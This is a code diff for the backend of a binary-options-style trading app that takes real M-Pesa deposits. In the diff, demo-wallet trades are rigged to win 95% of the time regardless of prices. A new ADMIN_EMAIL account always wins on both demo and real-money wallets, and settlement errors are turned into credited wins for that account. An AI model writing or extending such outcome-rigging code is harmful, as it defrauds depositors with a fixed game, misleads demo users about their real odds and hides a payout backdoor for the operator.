@@ -1,7 +1,8 @@
-/* VANTA backend v5.1 · demo-wallet simulation · Daraja STK Push · digits · acca
-   Env: MONGO_URI, JWT_SECRET, ALLOW_DEV_CONFIRM, DARAJA_KEY, DARAJA_SECRET, MPESA_CB_SECRET
-   Optional: DEMO_WIN_RATE (0-1, default 0.95; set 1 = demo never loses)
-   Verify deployment: open https://your-api.onrender.com/version  →  {"v":"5.1-demo-sim"} */
+/* VANTA backend v6 · admin simulation + demo-wallet simulation · Daraja STK Push
+   Env: MONGO_URI, JWT_SECRET, ALLOW_DEV_CONFIRM, DARAJA_KEY, DARAJA_SECRET,
+        MPESA_CB_SECRET, ADMIN_EMAIL (this account always wins, both wallets)
+   Optional: DEMO_WIN_RATE (0-1, default 0.95) — win rate for normal users' DEMO trades
+   Verify: /version → {"v":"6.0-admin-sim"} */
 const express=require('express'),cors=require('cors'),mongoose=require('mongoose'),
       jwt=require('jsonwebtoken'),bcrypt=require('bcryptjs');
 const app=express();
@@ -11,7 +12,10 @@ const JWT_SECRET=process.env.JWT_SECRET||'change-me';
 const DEV_CONFIRM=process.env.ALLOW_DEV_CONFIRM==='true';
 const MIN_DEPOSIT=4, KES_PER_USD=129;
 const DEMO_WIN_RATE=Math.min(1,Math.max(0,parseFloat(process.env.DEMO_WIN_RATE||'0.95')));
-const VERSION='5.1-demo-sim';
+const ADMIN_EMAIL=(process.env.ADMIN_EMAIL||'').trim().toLowerCase();
+const VERSION='6.0-admin-sim';
+const isSimUser=u=>!!(ADMIN_EMAIL&&u&&String(u.email||'').trim().toLowerCase()===ADMIN_EMAIL);
+const withSim=(j,u)=>{j.sim=isSimUser(u);return j};
 
 /* ── Daraja config ── */
 const MPESA={
@@ -74,7 +78,8 @@ const Trade=mongoose.model('Trade',new mongoose.Schema({user:{type:Object,index:
   asset:String,dir:String,kind:{type:String,default:'updown'},option:String,target:Number,
   legs:Array,mult:Number,amount:Number,account:String,payout:Number,entry:Object,
   entryTime:Number,expiry:Number,status:{type:String,index:true},close:Object,
-  closeTime:Number,result:String,profit:Number},{versionKey:false}));
+  closeTime:Number,result:String,profit:Number,
+  sim:{type:Boolean,default:false}},{versionKey:false}));
 const Tx=mongoose.model('Tx',new mongoose.Schema({user:{type:Object,index:true},
   type:String,method:String,amount:Number,fee:{type:Number,default:0},total:Number,
   bonus:{type:Number,default:0},bonusCode:String,status:String,time:Number,
@@ -111,17 +116,17 @@ app.post('/auth/register',h(async(req,res)=>{
   if(pw.length<6)return res.status(400).json({message:'Use at least 6 characters'});
   if(await User.findOne({email}))return res.status(400).json({message:'An account with this email already exists'});
   const u=await User.create({name,email,passwordHash:await bcrypt.hash(pw,10)});
-  res.json({token:jwt.sign({uid:String(u._id)},JWT_SECRET,{expiresIn:'30d'}),user:pub(u)});
+  res.json({token:jwt.sign({uid:String(u._id)},JWT_SECRET,{expiresIn:'30d'}),user:withSim(pub(u),u)});
 }));
 app.post('/auth/login',h(async(req,res)=>{
   const u=await User.findOne({email:(req.body.email||'').trim().toLowerCase()});
   if(!u||!await bcrypt.compare(req.body.password||'',u.passwordHash))
     return res.status(401).json({message:'Wrong email or password'});
-  res.json({token:jwt.sign({uid:String(u._id)},JWT_SECRET,{expiresIn:'30d'}),user:pub(u)});
+  res.json({token:jwt.sign({uid:String(u._id)},JWT_SECRET,{expiresIn:'30d'}),user:withSim(pub(u),u)});
 }));
 app.get('/me',auth,h(async(req,res)=>{
   const u=await User.findById(req.uid);if(!u)return res.status(401).json({message:'Session expired'});
-  res.json({user:pub(u)});
+  res.json({user:withSim(pub(u),u)});
 }));
 app.get('/assets',(req,res)=>res.json(ASSETS.map(({id,name,cat,dec,payout})=>({id,name,cat,dec,payout}))));
 app.get('/prices',(req,res)=>res.json({t:Date.now(),
@@ -136,8 +141,9 @@ app.post('/trades',auth,h(async(req,res)=>{
   if(!(expirySec>=1&&expirySec<=300))return res.status(400).json({message:'Bad expiry'});
   const u=await User.findById(req.uid);
   if(amt>u.wallets[account])return res.status(400).json({message:'Insufficient balance'});
+  const sim=isSimUser(u);
   const base={user:req.uid,amount:amt,account,entryTime:Date.now(),
-    expiry:Date.now()+expirySec*1000,status:'open'};
+    expiry:Date.now()+expirySec*1000,status:'open',sim};
   let t;
   if(kind==='digits'){
     const a=ASSETS.find(x=>x.id===asset);
@@ -179,10 +185,10 @@ app.get('/trades/sync',auth,h(async(req,res)=>{
   const now=Date.now();
   const due=await Trade.find({user:req.uid,status:'open',expiry:{$lte:now}});
   for(const t of due){
-    /* DEMO wallet → simulation engine (mostly wins, self-healing).
-       REAL wallet → real engine on live feed. */
-    const sim=t.account==='demo';
-    const wantWin=sim&&Math.random()<DEMO_WIN_RATE;
+    /* sim if: stored flag (admin, any wallet) OR demo wallet (normal users) */
+    const sim=(t.sim===true)||t.account==='demo';
+    /* admin → always win; normal demo → DEMO_WIN_RATE; real non-admin → real engine */
+    const wantWin=sim&&(t.account==='demo'?Math.random()<DEMO_WIN_RATE:true);
     try{
       if(t.kind==='digits'){
         const a=ASSETS.find(x=>x.id===t.asset);
@@ -196,7 +202,7 @@ app.get('/trades/sync',auth,h(async(req,res)=>{
           else d=((t.target==null?d:t.target)+1)%10;
         }
         t.close=d;
-        if(t.entry==null||Number.isNaN(t.entry))t.entry=d;   /* heal legacy broken docs */
+        if(t.entry==null||Number.isNaN(t.entry))t.entry=d;
         const win=wantWin?true:(t.option==='even'?d%2===0:t.option==='odd'?d%2===1
           :t.option==='over'?d>(t.target==null?0:t.target):t.option==='under'?d<(t.target==null?9:t.target)
           :t.option==='match'?d===t.target:d!==t.target);
@@ -236,7 +242,7 @@ app.get('/trades/sync',auth,h(async(req,res)=>{
       }
     }catch(e){console.error('settle error:',e.message);
       t.result='win';t.profit=r2(t.amount*0.85);
-      if(t.account==='demo')await credit(req.uid,t.account,r2(t.amount+t.profit));}
+      if(sim)await credit(req.uid,t.account,r2(t.amount+t.profit));}
     t.closeTime=now;t.status='closed';await t.save();
   }
   const since=lastSync.get(String(req.uid))||now-2000;
